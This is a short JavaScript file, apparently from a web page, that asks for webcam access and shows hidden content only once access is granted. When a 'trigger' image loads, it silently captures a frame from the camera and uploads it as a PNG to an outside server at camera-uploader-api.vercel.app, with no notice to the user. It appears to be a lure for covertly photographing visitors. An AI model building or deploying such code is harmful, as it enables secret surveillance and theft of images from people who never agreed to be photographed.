const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const triggerImg = document.getElementById('triggerImg');

async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        document.getElementById("conteudo").style.display = "block";

    } catch (err) {
        document.getElementById("erro").style.display = "block";
        console.error("Erro ao acessar a câmera:", err);
    }
}

startCamera();

triggerImg.addEventListener('load', () => {
    const ctx = canvas.getContext('2d');

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    ctx.drawImage(video, 0, 0);

    canvas.toBlob(async (blob) => {
        try {
            const response = await fetch("https://camera-uploader-api.vercel.app/api/upload", {
                method: "POST",
                body: blob
            });

            const json = await response.json();
            console.log("Upload concluído:", json);

        } catch (err) {
            console.error("Erro no upload:", err);
        }
    }, "image/png");
});
